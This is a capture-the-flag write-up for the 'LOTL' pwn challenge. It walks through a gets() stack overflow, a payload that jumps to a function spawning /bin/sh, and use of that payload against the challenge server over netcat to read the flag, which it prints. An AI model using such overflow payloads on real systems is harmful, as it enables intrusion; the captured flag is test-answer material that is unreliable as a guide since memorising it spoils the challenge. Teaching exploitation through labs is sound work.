# LOTL
Save the planet!

Well, we should then better LOTL and use what we have, right?

```
nc 46.101.107.117 2102
```

Get a shell and read the flag.

[lotl](lotl)

---

Let's see what we got:
```
$ file lotl
lotl: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=05ea252a13b095c8275884ab0350d0f6848f4e9c, not stripped

$ ./lotl
Welcome! Please give me your name!
> Jan
Hi Jan, nice to meet you!
```

The challenge type is `pwn`, so let's try a bit longer name:
```
4 ./lotl
Welcome! Please give me your name!
> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hi aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, nice to meet you!
Segmentation fault
```

Here we go, `segfault`. How can we exploit it?

## Static analysis
Looking what's inside using [Ghidra](https://ghidra-sre.org/):

```
undefined8 main(void)
{
  char local_28 [32];
  
  ignore_me_init_buffering();
  ignore_me_init_signal();
  printf("Welcome! Please give me your name!\n> ");
  gets(local_28);
  printf("Hi %s, nice to meet you!\n",local_28);
  return 0;
}
```

Here is the vulnerability, reading a user input into small buffer using `gets`.

There is one more useful method:
```
void profit(void)
{
  system("/bin/sh");
  return;
}
```

The idea is simple, overflow the buffer and jump into `profit` method.

At first, we need `profit` address:
```
$ objdump -t lotl | grep profit
000000000040086d g     F .text	00000013 profit
```

## Smashing the stack
We need to skip 32 (buffer size) + 8 (`rbp`) bytes. Then comes the profit `address`:
```
$ echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x6d\x08\x40\x0\x0\x0\x0\x0" > payload
```

I used `gdb` to make sure `profit` is indeed getting called.

Next, we have 2 options:
- Append a predefined shell command into our payload
- Create an interactive shell

### Option 1: Using predefined shell commands
Let's add `ls` command to our payload:
```
$ echo ls >> payload
$ ./lotl < payload
Welcome! Please give me your name!
> Hi AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ@, nice to meet you!
bochs-2.6.11  bochs-2.6.11.tar.gz  CAT  data  data_storage  lotl  payload  payload.bin  tool.gif
Segmentation fault
```

Great, the command was executed!

### Option 2: Using interactive shell
This is more cool. Use the original payload without any extra commands and execute it like this:
```
$ (cat payload; cat) | ./lotl 
Welcome! Please give me your name!
> Hi AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ@, nice to meet you!
ls
bochs-2.6.11  bochs-2.6.11.tar.gz  CAT  data  data_storage  lotl  payload  payload.bin  tool.gif
pwd
/home/kali/macos
..
```

Finally, replace the local binary with the _netcat_ call:
```
$ cat payload; cat) | nc 46.101.107.117 2102
Welcome! Please give me your name!
> Hi CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ@, nice to meet you!
ls
challenge1
flag
ynetd
cat flag
he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}
```

_(For some reason I had to adjust the payload offest by -8)_

The flag is `he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}`
